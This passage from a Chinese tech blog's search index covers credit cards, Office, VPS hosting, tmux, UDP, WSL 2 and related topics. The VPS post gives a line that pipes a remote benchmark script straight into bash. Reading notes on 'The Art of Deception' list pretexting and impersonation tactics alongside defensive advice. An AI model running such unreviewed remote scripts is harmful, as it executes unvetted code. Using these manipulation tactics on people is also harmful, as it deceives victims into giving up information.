<h2 id="双标卡"><a href="#双标卡" class="headerlink" title="双标卡"></a>双标卡</h2><p>国内有一些信用卡上面既有银联的标志，也有海外卡组织的标志，这种卡就是<strong>双标卡</strong>。它可以在付款的时候选择指定的卡组织，比如在国内购物使用银联，在国外购物使用Visa。但是，按照国际惯例，一张卡只能归属于一个银行卡组织，这样看来，还是传统的两张单标卡更靠谱一点。</p>
<h2 id="信用卡安全码"><a href="#信用卡安全码" class="headerlink" title="信用卡安全码"></a>信用卡安全码</h2><p><strong>信用卡安全码</strong>常为3位数字，印在卡片背面卡号后四位处，Visa的安全码叫做<strong>CVV2</strong>（Card Verification Value 2），银联的安全码叫做CVN2（Card Validation Number 2），JCB的安全码叫做CAV2（Card Authentication Value 2）。安全码相当于信用卡的密码，常用于网络交易的过程中，所以，请保护好自己的安全码，不要被泄露。</p>
<h2 id="主卡副卡"><a href="#主卡副卡" class="headerlink" title="主卡副卡"></a>主卡副卡</h2><h2 id="币种"><a href="#币种" class="headerlink" title="币种"></a>币种</h2><h2 id="PayPal"><a href="#PayPal" class="headerlink" title="PayPal"></a>PayPal</h2><h2 id="借记卡和储蓄卡"><a href="#借记卡和储蓄卡" class="headerlink" title="借记卡和储蓄卡"></a>借记卡和储蓄卡</h2>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>说说MS Office</title>
    <url>/2019/01/08/talk-about-ms-office/</url>
    <content><![CDATA[<p>Office是最常使用的<strong>办公套件</strong>，一般来说，提到Office，最先想到的是微软的Office，即<strong>MS Office</strong>，除此之外，还有<strong>WPS Office</strong>，这是由金山推出的。</p>
<p>Office原生支持Windows桌面版，这也是目前功能最全且<strong>收费</strong>的Office版本，时至今日，Office也可以用于UWP、Android、iOS、macOS以及Web等。一般来说，我们说的Office是指Windows桌面版的Office套件。</p>
<p>在本文写作之际，最新的Office版本为<strong>Office 2019</strong>，但据个人观察，<strong>Office 2010</strong>仍然被大多数人所使用。</p>
<span id="more"></span>
<p>Office套件一般包括以下软件：</p>
<ul>
<li><strong>Word</strong>：文档编辑工具</li>
<li><strong>Excel</strong>：表格编辑工具</li>
<li><strong>PowerPoint</strong>：幻灯片演示文稿制作工具</li>
<li><strong>Access</strong>：小型数据库</li>
<li><strong>OneNote</strong>：在线笔记应用</li>
<li><strong>Outlook</strong>：电子邮箱应用</li>
<li><strong>Publisher</strong>：桌面出版应用软件</li>
<li><strong>Visio</strong>：流程图制作工具</li>
</ul>
<p>以Office 2016为例，其中自带的OneNote全称为<strong>OneNote 2016</strong>（桌面版）；除此之外，还有Microsoft Store中<strong>UWP版</strong>的OneNote，即<strong>OneNote for Windows 10</strong>，简称为OneNote，此版本的OneNote是功能最全的OneNote，也是微软的主要开发版，并内置于所有的Windows 10电脑中，另外，Office 2019套件中也已替换成了此版本的OneNote。关于OneNote（OneNote for Windows 10）与OneNote 2016的详细区别请参考微软Office官方帮助信息：<a href="https://support.office.com/zh-cn/article/onenote-%E4%B8%8E-onenote-2016-%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F-a624e692-b78b-4c09-b07f-46181958118f">OneNote与OneNote 2016有什么区别？</a></p>
<h2 id="Office-365"><a href="#Office-365" class="headerlink" title="Office 365"></a>Office 365</h2><p>不同于Office 2016或Office 2019的一次性购买模式，<strong>Office 365</strong>采用订阅模式，即每月支付一定费用。它可以享受到更多的优惠，比如1TB的OneDrive空间和持续的软件更新等。具体可参考微软Office官方帮助信息：<a href="https://support.office.com/zh-cn/article/office-365-%E5%92%8C-office-2019-%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F-ed447ebf-6060-46f9-9e90-a239bd27eb96">Office 365和Office 2019之间的区别是什么？</a></p>
<h2 id="G-Suite"><a href="#G-Suite" class="headerlink" title="G Suite"></a>G Suite</h2><p><strong>G Suite</strong>是由Google公司推出的办公套件，其中主要包括<strong>Google Docs（文档）</strong>、<strong>Google Sheets（表格）</strong>、<strong>Google Slides（幻灯片）</strong>等，适用于Android、iOS、Web平台。这些软件兼容Office的文件格式。</p>
<h2 id="iWork"><a href="#iWork" class="headerlink" title="iWork"></a>iWork</h2><p><strong>iWork</strong>是由苹果公司推出的办公套件，其中主要包括<strong>Pages文稿</strong>、<strong>Numbers表格</strong>、<strong>Keynote讲演</strong>，适用于macOS、iOS平台。这些软件生成的文件格式与Office中的Word、Excel、PowerPoint互不兼容。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>谈谈 SEO</title>
    <url>/2018/09/23/talk-about-seo/</url>
    <content><![CDATA[<p>SEO，即搜索引擎优化（Search Engine Optimization），下面列出几点 SEO 方面的建议：</p>
<ul>
<li>页面的URL应该足够反映页面的内容</li>
</ul>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>说说 VPS</title>
    <url>/2019/01/08/talk-about-vps/</url>
    <content><![CDATA[<p><strong>VPS</strong>（Virtual Private Server）即<strong>虚拟专用服务器</strong>，它不等同于<strong>独立服务器</strong>，独立服务器是指货真价实的物理机器，而 VPS 则是在独立服务器上虚拟化的多个虚拟机器。与此类似的，<strong>虚拟空间</strong>（或虚拟主机）则是指 VPS 上某个特定的应用环境，它没有访问系统底层的权限。显然，独立服务器偏贵，虚拟空间限制又多，而 VPS 这一中间选择成为了广大爱好者的首选。</p>
<span id="more"></span>
<h2 id="虚拟化技术"><a href="#虚拟化技术" class="headerlink" title="虚拟化技术"></a>虚拟化技术</h2><p>VPS 所使用的虚拟化技术主要有 <strong>KVM</strong> 和 <strong>OpenVZ</strong> （简称 OVZ），以下是两者的优缺点对比：</p>
<p>KVM：</p>
<ul>
<li>优点：独占内核、内存等</li>
<li>缺点：价格较贵</li>
</ul>
<p>OpenVZ：</p>
<ul>
<li>优点：价格低</li>
<li>缺点：共享内核、内存等</li>
</ul>
<p>简单来说，KVM 拥有对内核更多的控制权，而 OpenVZ 因为共享资源的情况受<strong>超售</strong>影响较大，现在，越来越多的 VPS 商家也开始使用 KVM 架构来虚拟化 VPS。个人建议，尽量选择 KVM 架构的 VPS。</p>
<h2 id="收费方式"><a href="#收费方式" class="headerlink" title="收费方式"></a>收费方式</h2><p>VPS 一般按两种方式收费，即<strong>按月收费</strong>或<strong>按小时收费</strong>，显然，按小时收费更加灵活，当不需要使用时，直接关机就能停止收费。除此之外，VPS 一般会限制每月最多可使用的流量，当超过额度后，会收取流量费。</p>
<h2 id="VPS-商家"><a href="#VPS-商家" class="headerlink" title="VPS 商家"></a>VPS 商家</h2><p>当前主流的 VPS 商家有：<a href="https://bandwagonhost.com/index.php">BandwagonHost</a>，<a href="https://www.vultr.com/">Vultr</a>，<a href="https://www.digitalocean.com/">DigitalOcean</a>。</p>
<p>BandwagonHost，中文又称搬瓦工，它们采用按月收费，支持支付宝付款，在 2019 年之前，它们推出过最低每年 19.99 美元的 VPS，这应该是那时候最便宜且稳定的 VPS 商家了，但如今它们已经取消了这一方案，并全部使用 KVM 架构，现在它们的最低方案是每年 49.99 美元，配置 1G 内存，20G 固态，每月 1T 的流量。</p>
<p>Vultr，它们采用按小时收费的方式，支持支付宝付款，全部采用 KVM 架构，现在最低的方案是每年 42 美元，配置 512MB 内存，10G 固态，每月 0.5T 的流量，个人非常推荐。</p>
<p>DigitalOcean，它们同样采用按小时收费的方式，使用信用卡付款，全部采用 KVM 架构，现在最低的方案是每年 60 美元，配置 1G 内存，25G 固态，每月 1T 的流量。</p>
<h2 id="测试-VPS-性能"><a href="#测试-VPS-性能" class="headerlink" title="测试 VPS 性能"></a>测试 VPS 性能</h2><p>一般在首次连接到 VPS 之后，建议进行一个性能测试，通常要测试的项目包括磁盘性能、网络性能以及一些基本参数等。这里推荐使用 oldking 开发的一键测试脚本 <a href="https://www.oldking.net/350.html">SuperBench.sh</a>，具体使用方法如下命令所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -qO- git.io/superbench.sh | bash</span><br></pre></td></tr></table></figure>

<h2 id="黑话"><a href="#黑话" class="headerlink" title="黑话"></a>黑话</h2><p>VPS 相关的论坛中经常会有一些行业黑话，以下做简要说明：</p>
<ul>
<li>杜甫：即独服的意思，指前面提到的独立服务器。</li>
<li>母鸡：指用来虚拟化 VPS 的物理主机。</li>
<li>小鸡：即 VPS，尤其指配置比较低的廉价 VPS。</li>
<li>养鸡：续费 VPS 的过程。</li>
<li>CN2 线路：指中国电信与美国日本韩国香港等地机房直连的服务器线路，速度快且稳定。</li>
<li>套路云：指阿里云。</li>
<li>良心云：指腾讯云。</li>
<li>雨林云：指 AWS，取自亚马逊热带雨林。</li>
</ul>
<h2 id="一些建议"><a href="#一些建议" class="headerlink" title="一些建议"></a>一些建议</h2><p>如果你的 VPS 内存较小，比如 512M 内存以下，则建议安装 32 位操作系统。操作系统建议选择 CentOS 7 以上。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>《TAOUP》读书笔记</title>
    <url>/2018/08/02/taoup/</url>
    <content><![CDATA[<p>我没有写错，本文所记述的不是Knuth的那本举世瞩目的TAOCP(计算机程序设计艺术)，而是ESR所写的<strong>TAOUP</strong>，即The Art of UNIX Programming(UNIX编程艺术)。</p>
<h2 id="哲学"><a href="#哲学" class="headerlink" title="哲学"></a>哲学</h2><p>Unix的设计哲学总体上可以概括为以下几点：</p>
<ol>
<li>模块原则：使用简洁的接口拼合简单的部件</li>
<li>清晰原则：清晰胜于机巧</li>
<li>组合原则：设计时考虑拼接组合</li>
<li>分离原则：策略同机制分离，接口同引擎分离</li>
<li>简洁原则：设计要简洁，复杂度能低则低</li>
<li>吝啬原则：除非却无它法，不要编写庞大的程序</li>
<li>透明性原则：设计要可见，以便审查和调试</li>
<li>健壮原则：健壮源于透明与简洁</li>
<li>表示原则：把知识叠入数据以求逻辑质朴而健壮</li>
<li>通俗原则：接口设计避免标新立异</li>
<li>缄默原则：如果一个程序没什么好说的，就沉默</li>
<li>补救原则：出现异常时，马上退出并给出足够错误信息</li>
<li>经济原则：宁花机器一分，不花程序员一秒</li>
<li>生成原则：避免手工hack，尽量编写程序去生成程序</li>
<li>优化原则：雕琢前先要有原型，跑之前先学会走</li>
<li>多样原则：决不相信所谓“不二法门”的断言</li>
<li>扩展原则：设计着眼未来，未来总比预想来得快<span id="more"></span>
所有的Unix哲学浓缩为一条铁律就是<strong>KISS</strong>原则，即Keep It Simple, Stupid！</li>
</ol>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>telnet协议分析</title>
    <url>/2018/08/24/telnet/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>terminal 与 shell</title>
    <url>/2018/09/19/terminal-shell/</url>
    <content><![CDATA[<p><strong>terminal</strong>，常被翻译为<strong>终端</strong>，一般指黑色的窗口，终端可以设置字体、大小、布局和颜色等。Windows 中常见的第三方终端有 <a href="https://conemu.github.io/">ConEmu</a>、<a href="https://cmder.net/">Cmder</a> 等。</p>
<p><strong>shell</strong>，有时也被翻译为外壳或壳层，通常指操作系统中位于用户与内核之间的一层，主要用于和用户交互，因此，shell 分为两类：命令行界面（CLI）和图形用户界面（GUI）。现在所指的 shell 通常指命令行 shell，Linux 中常见的命令行 shell 有 <a href="https://www.gnu.org/software/bash/">Bash</a>、<a href="https://www.zsh.org/">Zsh</a> 等。</p>
<p>通俗点说，terminal 属于外层，shell 属于内层，terminal 包裹着 shell，输入进 terminal 的命令要由 shell 去解释执行。</p>
<span id="more"></span>

<p>和 terminal 很像的一个东西叫 <strong>console</strong>，常被翻译为<strong>控制台</strong>，它也是一个黑色的窗口，用来输入命令，但与 terminal 不同的是，console 与物理相关，且具有<strong>唯一性</strong>。举例来说，没有图形界面的 Linux 开机后，显示在屏幕上的就是 console，它是与这台电脑相关的，且只有一个；而有图形界面的 Linux 开机后，打开的黑色窗口就是 terminal，你可以打开多个。</p>
<p>在 Windows 中，这一切有点混乱，具体就表现在：那个黑色的窗口应该叫<strong>命令提示符</strong>还是<strong>控制台窗口</strong>？就如下图所示：</p>
<p><img src="/images/cmd.jpg" alt="cmd"></p>
<p>首先，命令提示符的本意指的是命令行前面的提示符，在 Linux 中常被称为 <strong>prompt</strong>，如下所示：</p>
<p><img src="/images/prompt.jpg" alt="prompt"></p>
<p>显然，在 Windows 中，命令提示符指的是一种解释执行命令的 shell，此外，控制台窗口应该指的是终端。因此，<strong>在 Windows 中有两种 shell，即命令提示符和 PowerShell，它们都共用了同一终端，即控制台窗口。</strong>这么理解的原因可参考微软的<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands">官方文档</a>，摘录如下：</p>
<blockquote>
<p>Windows has two command shells: The Command shell and PowerShell.</p>
</blockquote>
<p>与 Linux 不同的是，Windows 为每个 shell 都做了一个可执行程序，如命令提示符是 <code>cmd.exe</code>，而 PowerShell 是 <code>powershell.exe</code>，所以在 Windows 中我们习惯说“打开命令提示符”或者“打开 PowerShell”；而在 Linux 中，我们更习惯说“打开终端”。</p>
<p>值得注意的是，在 Windows 10 的最新版本中，微软推出了全新的 <strong><a href="https://github.com/microsoft/terminal">Windows Terminal</a></strong> ，用以取代老旧且功能匮乏的控制台窗口。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>《欺骗的艺术》读书笔记</title>
    <url>/2017/12/05/the-art-of-deception/</url>
    <content><![CDATA[<ol>
<li>人的因素是安全过程中最薄弱的环节。</li>
<li>你只要说你是一个写书的或者写电影剧本的，每个人都会对你开绿灯。</li>
<li>把重要的问题掺杂在琐碎的、不合逻辑的问题中间，这样可以给人一种可信的感觉。</li>
<li>不要在得到关键信息后马上结束谈话。再问两三个问题，闲聊几句，然后才说再见。以后，如果受害者记起你曾经问过什么，则极有可能是最后几个问题，其他的通常都忘掉了。</li>
<li>两三样信息可能就足以支撑起一次成功的假冒行为 —— 社交工程师冒用别人的身份。取得职员的名字、他的电话，以及他的职员编号 —— 或许，最好也能得到其经理的名字和电话 —— 这样，即使一个半瓶子醋的社交工程师，也有了足够的信息，使自己在给下一个目标打电话时听起来非常可信。</li>
<li>安全培训需要强调一点：当你有疑虑时，必须确认，确认，再确认。</li>
<li>执法部门的人跟军队里的人一样，从接受训练的第一天起就形成了一个根深蒂固的等级观念。只要社交工程师扮作警官或中尉 —— 级别比跟他谈话的人高 —— 受害者就会拘于一条长时间得来的教训，即“不要质问比你职别高的人”。级别，换个说法，就是特权，尤其是不被级别低的人质问的特权。</li>
<li>每个人都应该明白社交工程师的伎俩：获得尽可能多的与目标有关的信息，再利用这些信息使人相信自己是内部人员。然后一剑封喉。</li>
<li>逆向社交工程学：一种社交工程攻击方式。攻击者建立起这样一个场景：让受害者遇到问题，并向攻击者寻求帮助。逆向社交工程学的另一种表现形式是以其人之道还治其人之身。攻击目标识别出自己受到了攻击，从而利用心理学原理来牵制攻击者，并且从他那里引诱出尽可能多的信息，进而有效的保护目标资产。</li>
<li>新员工最容易成为攻击者的目标。他们认识的人还不多，也不太清楚公司的办事程序，以及什么该做什么不该做。而且，为给人留下良好的第一印象，他们急于表现自己是多么乐于合作与反应迅捷。</li>
<li>第一条原则：除非万不得已，否则不要造访他们的办公室。仅凭着电话中的声音，他们是很难认出你来的，而如果他们不能人称认出你，那就不能逮捕你。</li>
</ol>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title>tmux 小记</title>
    <url>/2018/09/18/tmux/</url>
    <content><![CDATA[<p><a href="https://github.com/tmux/tmux">tmux</a> 是一款优秀的<strong>终端复用</strong>工具，在 Ubuntu 下，使用 <code>sudo apt install tmux</code> 即可安装，输入 <code>tmux</code> 即可开始使用。与 tmux 相似的软件还有 <a href="https://www.gnu.org/software/screen/">Screen</a> 等。</p>
<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><h3 id="Session（会话）"><a href="#Session（会话）" class="headerlink" title="Session（会话）"></a>Session（会话）</h3><p>当输入<code>tmux</code>后，实际上创建了一个Session，你可以在这个Session里创建多个Window，在Window里创建多个Pane。</p>
<h3 id="Window（窗口）"><a href="#Window（窗口）" class="headerlink" title="Window（窗口）"></a>Window（窗口）</h3><p>Window是显示给你的一整片窗口，你可以创建多个Window，在一个Window里面你又可以创建多个Pane，以此来执行多个任务。</p>
<h3 id="Pane（窗格-面板）"><a href="#Pane（窗格-面板）" class="headerlink" title="Pane（窗格/面板）"></a>Pane（窗格/面板）</h3><p>Pane是tmux中的最小单位，每个Pane相当于一个终端。</p>
<span id="more"></span>
<p>一个常见的tmux运行效果可能如下图所示：<br><img src="/images/tmux.jpg" alt="tmux"><br>其中，Window被分成了3个Pane，每个Pane之间通过<strong>Pane Border</strong>（面板分隔符）加以区分。Window底部则是<strong>Status Bar</strong>（状态栏），状态栏从左往右依次被分为<strong>左面板</strong>、<strong>窗口列表</strong>、<strong>右面板</strong>。按照上图所示，其中左面板显示了Session的名称，窗口列表则显示了当前Window的索引值和名称，最后右面板依次显示了计算机名称、时间、日期。</p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><code>tmux</code>命令拥有众多参数，如下所示：</p>
<ul>
<li><code>tmux -V</code>：显示tmux版本号</li>
<li><code>tmux ls</code>或<code>tmux list-sessions</code>：列出所有tmux Session</li>
<li><code>tmux a</code>或<code>tmux attach</code>：连接（attach）到上一次的Session</li>
<li><code>tmux a -t 0</code>：连接到名为0的Session</li>
<li><code>tmux new -s basic</code>或<code>tmux new-session -s basic</code>：新建名为basic的Session，若不指定<code>-s</code>参数，则默认按数字命名</li>
<li><code>tmux kill-session -t foo</code>：删除名为foo的Session</li>
<li><code>tmux kill-server</code>：删除所有Session</li>
<li><code>tmux source ~/.tmux.conf</code>：重载配置文件</li>
</ul>
<h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p>tmux中的绝大部分操作都需要一个<strong>快捷键前缀</strong>加上相应的指令，tmux中默认的快捷键前缀是<code>Ctrl + b</code>，举例来说，使用<code>prefix + %</code>可以将当前Window分为左右两个Pane，这实际上是说，先按下<code>Ctrl + b</code>，再按下<code>%</code>，即可完成操作。值得注意的是，tmux默认的快捷键前缀是很糟糕的，因为很多程序都会使用到<code>Ctrl + b</code>，但同时，快捷键前缀也是可以自定义的。常用的快捷键如下：</p>
<ul>
<li>Session<ul>
<li><code>prefix + d</code>：离开（datach）当前Session，即退出tmux</li>
</ul>
</li>
<li>Window<ul>
<li><code>prefix + c</code>：创建（create）一个新的Window</li>
<li><code>prefix + n</code>：切换到下一个（next）Window</li>
<li><code>prefix + p</code>：切换到上一个（previous）Window</li>
<li><code>prefix + &amp;</code>：关闭当前Window</li>
</ul>
</li>
<li>Pane<ul>
<li><code>prefix + %</code>：将当前光标所在Pane分为左右两个Pane</li>
<li><code>prefix + &quot;</code>：将当前光标所在Pane分为上下两个Pane</li>
<li><code>prefix + o</code>：在多个Pane之间切换光标，或按上下左右键</li>
<li><code>prefix + x</code>：关闭当前光标所在Pane</li>
<li><code>prefix + ?</code>：查看快捷键列表</li>
<li><code>prefix + :</code>：进入命令行模式（类似Vim）</li>
<li><code>prefix + 空格键</code>：依次轮回使用tmux预定义的Pane布局</li>
</ul>
</li>
</ul>
<p>值得注意的是，当创建Session后，默认会创建一个Window，当创建Window后，默认会创建一个Pane。</p>
<h2 id="tmux-conf"><a href="#tmux-conf" class="headerlink" title=".tmux.conf"></a>.tmux.conf</h2><p><code>$HOME/.tmux.conf</code>文件是tmux的配置文件，tmux在启动时会按照此文件中的命令进行相关配置，个人常用的配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设定快捷键前缀</span><br><span class="line">unbind-key C-b</span><br><span class="line">set-option -g prefix C-x</span><br><span class="line">bind-key C-x send-prefix</span><br><span class="line">set-option -g escape-time 0</span><br><span class="line"></span><br><span class="line"># 开启鼠标模式</span><br><span class="line">set -g mouse on</span><br></pre></td></tr></table></figure>

<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>tmux支持许多插件，在安装插件之前最好先安装插件管理器<a href="https://github.com/tmux-plugins/tpm">TPM</a>，使用如下命令即可下载TPM：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm</span><br></pre></td></tr></table></figure>

<p>下载完之后，只需在<code>.tmux.conf</code>文件底部添加相关配置，然后进入tmux输入<code>prefix + I</code>，即可自动下载并安装相应的插件，升级插件可使用<code>prefix + U</code>。个人常用的插件如下：<br>相应的，<code>.tmux.conf</code>文件中插件相关的配置项如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 插件</span><br><span class="line"># List of plugins</span><br><span class="line">set -g @plugin &#x27;tmux-plugins/tpm&#x27;</span><br><span class="line">set -g @plugin &#x27;tmux-plugins/tmux-sensible&#x27;</span><br><span class="line"></span><br><span class="line"># Other examples:</span><br><span class="line"># set -g @plugin &#x27;github_username/plugin_name&#x27;</span><br><span class="line"># set -g @plugin &#x27;git@github.com/user/plugin&#x27;</span><br><span class="line"># set -g @plugin &#x27;git@bitbucket.com/user/plugin&#x27;</span><br><span class="line"></span><br><span class="line"># Initialize TMUX plugin manager (keep this line at the very bottom of tmux.conf)</span><br><span class="line">run -b &#x27;~/.tmux/plugins/tpm/tpm&#x27;</span><br></pre></td></tr></table></figure>

<p>值得注意的是，在更改<code>.tmux.conf</code>文件后，应该重启tmux，或者重载配置文件。</p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>有关tmux的更多使用技巧可以参考<a href="https://www.kancloud.cn/kancloud/tmux">《tmux: Productive Mouse-Free Development》</a>一书。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Udacity：Apollo起步学习笔记</title>
    <url>/2018/07/21/udacity-apollo/</url>
    <content><![CDATA[<p>本笔记记录自<a href="https://cn.udacity.com/course/self-driving-car-fundamentals-featuring-apollo--ud0419">ud0419-无人驾驶第一课：从Apollo起步</a>。</p>
<h2 id="一、无人驾驶概览"><a href="#一、无人驾驶概览" class="headerlink" title="一、无人驾驶概览"></a>一、无人驾驶概览</h2><p>无人驾驶车的6个等级：</p>
<ul>
<li>0级——基本等级：驾驶员是系统的唯一决策者。</li>
<li>1级——驾驶员辅助(Driver Assistance)：车辆为驾驶员提供转向或加速支持，驾驶员必须保持充分参与。</li>
<li>2级——部分自动化(Partial Automation)：车辆自动控制几项功能，如自动巡航控制和车道保持，但是驾驶员仍然必须执行自治系统处理的任何功能。</li>
<li>3级——有条件的自动化(Conditional Automation)：车辆自主驾驶，但驾驶员必须准备在必要的时候随时接管。</li>
<li>4级——高度自动化(No Human Interference)：车辆控制驾驶体验的所有面面，并且不期望驾驶员的介入，车辆可能根本没有方向盘或任何驾驶员控制装置，但是车辆可能被限制在某些区域，通常这被称为“地理围栏”，车辆可以在特定的地理围栏内完全自主的运行，但是在地理围栏之外，车辆不能自主操作，或者根本无法操作。</li>
<li>5级——完全自动化(Full Automation)：车辆可以在人类可以驾驶的任何地方完全自主地运行，在所有情况下应与人类驾驶员的水平一样高或比其更高。</li>
</ul>
<span id="more"></span>
<p>无人驾驶车的5个核心部件：</p>
<ul>
<li>计算机视觉(Computer Vision)：通过摄像头图像弄清楚我们周围的世界是怎样的。</li>
<li>传感器融合(Sensor Fusion)：合并来自其他传感器的数据，如激光和雷达，从而更加深入的了解我们周围的环境。</li>
<li>定位(Localization)：精确的确定我们在那个世界所处的位置。</li>
<li>路径规划(Path Planning)：绘制这个世界的路线，帮助我们到达我们想去的地方。</li>
<li>控制(Control)：为了让汽车沿着我们在路径规划期间建立的轨道。</li>
</ul>
<p>Apollo技术框架包含的4个层面：</p>
<ul>
<li>参考车辆平台</li>
<li>参考硬件平台</li>
<li>开源软件平台</li>
<li>云服务平台</li>
</ul>
<h2 id="二、高精度地图"><a href="#二、高精度地图" class="headerlink" title="二、高精度地图"></a>二、高精度地图</h2>]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>无人驾驶</tag>
        <tag>Apollo</tag>
      </tags>
  </entry>
  <entry>
    <title>UDP 协议分析</title>
    <url>/2021/01/12/udp/</url>
    <content><![CDATA[<p>UDP 全称 User Datagram Protocol，即<strong>用户数据报协议</strong>，它为调用它的应用程序提供了一种不可靠、无连接的服务。</p>
<p>UDP 无非就是对网络层协议增加了一点（多路）复用/（多路）分解服务而已。</p>
<p>使用 UDP 的上层协议有：</p>
<ul>
<li><a href="/2020/12/29/dns/" title="DNS">DNS</a></li>
<li>SNMP</li>
</ul>
<p>选择使用 UDP 的原因：</p>
<ul>
<li>关于发送什么数据以及何时发送的应用层控制更为精细。</li>
<li>无须连接建立。</li>
<li>无连接状态。</li>
<li>分组首部开销小。每个 TCP 报文段都有 20 字节的首部开销，而 UDP 仅有 8 字节的开销。</li>
</ul>
<p>使用 UDP 的应用是可能实现可靠数据传输的，这可通过在应用程序自身中建立可靠性机制来完成。<br>可参考 <a href="https://github.com/skywind3000/kcp">KCP</a>、<a href="https://www.chromium.org/quic">QUIC</a>。</p>
<span id="more"></span>

<h2 id="UDP-报文段结构"><a href="#UDP-报文段结构" class="headerlink" title="UDP 报文段结构"></a>UDP 报文段结构</h2><p>UDP 报文段结构如图所示：</p>
<p><img src="/images/udp-segment-structure.jpg" alt="UDP 报文段结构"></p>
<p>通过端口号可以使目的主机将应用数据交给运行在目的端系统中的相应进程（即执行分解功能）。<br>长度字段指示了在 UDP 报文段中的字节数（首部加数据）。<br>接收方使用检验和来检查在该报文段中是否出现了差错。</p>
<h2 id="UDP-检验和"><a href="#UDP-检验和" class="headerlink" title="UDP 检验和"></a>UDP 检验和</h2><p>发送方的 UDP 对报文段中的所有 16 比特字的和进行反码运算，求和时遇到的任何溢出都被回卷。得到的结果被放在 UDP 报文段中的检验和字段。</p>
<p>在接收方，全部的 16 比特字（包括检验和）加在一起。如果和为 <code>1111111111111111</code>，则未引入差错，反之，则已经出现了差错。</p>
<p>在既无法确保逐链路的可靠性，又无法确保内存中的差错检测的情况下，如果端到端数据传输服务要提供差错检测，UDP就必须在端到端基础上在运输层提供差错检测。这是一个在系统设计中被称颂的<strong>端到端原则</strong>（end-end principle）的例子，该原则表述为因为某种功能（在此时为差错检测）必须基于端到端实现：“在与较高级别提供这些功能的代价相比，在较低级别上设置的功能可能是冗余的或几乎没有价值的。”</p>
<p>虽然 UDP 提供差错检测，但它对差错恢复无能为力。UDP 的某种实现只是丢弃受损的报文段；其他实现是将受损的报文段交给应用程序并给出警告。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>升级到 WSL 2</title>
    <url>/2021/05/02/update-to-wsl-2/</url>
    <content><![CDATA[<p>从 2020 年末开始，微软逐步向 Windows 10 用户推送了 WSL 2 更新，WSL 2 相比 WSL 1 是一个巨大的变化，最显著的改变在于 WSL 2 开始采用 Hyper-V 虚拟机来运行 Linux，这会解决之前 WSL 的很多问题，但也可以看作是 WSL 项目的失败，本文所描述的主体为 WSL 2，有关 WSL 1 的相关内容请参考 <a href="/2018/08/21/wsl-problem/" title="WSL 相关问题解决">WSL 相关问题解决</a>。</p>
<span id="more"></span>

<h2 id="升级到-WSL-2"><a href="#升级到-WSL-2" class="headerlink" title="升级到 WSL 2"></a>升级到 WSL 2</h2><p>要查看当前安装的 WSL 版本，可通过 <code>wsl --list --verbose</code> 命令查看，其输出如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  NAME                   STATE           VERSION</span><br><span class="line">* Ubuntu                 Running         1</span><br></pre></td></tr></table></figure>

<p>VERSION 下面的结果为其版本号，上述为 WSL 1。</p>
<p>截至目前为止，无法直接安装 WSL 2，需要先安装 WSL 1，然后将其升级为 WSL 2。升级步骤如下：</p>
<ol>
<li>在 <strong>启用或关闭 Windows 功能</strong> 中勾选 <strong>虚拟机平台</strong>，或直接在管理员权限的 PowerShell 中输入 <code>Enable-WindowsOptionalFeature -Online -FeatureName &quot;VirtualMachinePlatform&quot;</code>；</li>
<li>下载并安装 <a href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">Linux 内核更新包</a> ；</li>
<li>输入 <code>wsl --set-version Ubuntu 2</code> 将已安装发行版设置为 WSL 2。</li>
</ol>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>Linux</tag>
        <tag>WSL</tag>
      </tags>
  </entry>
  <entry>
    <title>URI 与 URL 的区别</title>
    <url>/2018/04/29/url-uri/</url>
    <content><![CDATA[<p>URI，全称&quot;Uniform Resource Identifier&quot;，中文“统一资源标志符”，是一个用于标识某一互联网资源名称的字符串。URI 的最常见的形式是统一资源定位符（URL），经常指定为非正式的网址。更罕见的用法是统一资源名称（URN），其目的是通过提供一种途径，用于在特定的名字空间资源的标识，以补充网址。</p>
